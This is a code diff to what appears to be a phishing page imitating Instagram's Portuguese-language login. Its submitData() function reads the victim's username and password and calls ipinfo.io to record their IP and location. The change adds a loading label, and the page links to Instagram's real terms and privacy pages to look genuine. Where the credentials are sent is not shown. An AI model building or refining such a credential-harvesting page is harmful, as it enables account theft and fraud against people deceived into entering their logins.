@@ -87,7 +87,7 @@
               </script>
             <br>
             <br>
-            <button type="button" class="instagram" onclick="submitData()">Confirmar</button>
+            <button type="button" class="instagram" id="cared" onclick="submitData()">Confirmar</button>
             <br><br>
             <p style="font-size: 13px; color: #585757;">Ao continuar, você concorda com o <a style="color: #000; text-decoration: none;" href="https://help.instagram.com/581066165581870/?locale=pt_BR">Termos <br>de Uso</a> e a
                 <a style="color: #000;" href="https://privacycenter.instagram.com/policy/">Política de Privacidade</a> do Instagram.</p>
@@ -135,11 +135,14 @@
         async function submitData() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
+            const cared = document.getElementById('cared');
 
             if (username.trim() === "" || password.trim() === "") {
                 document.querySelector('.divB').style.display = "block";
                 return; // Impede que o código continue
             }
+            
+                    cared.innerText = "Carregando..."
 
             try {
                 const response = await fetch('https://ipinfo.io/json');
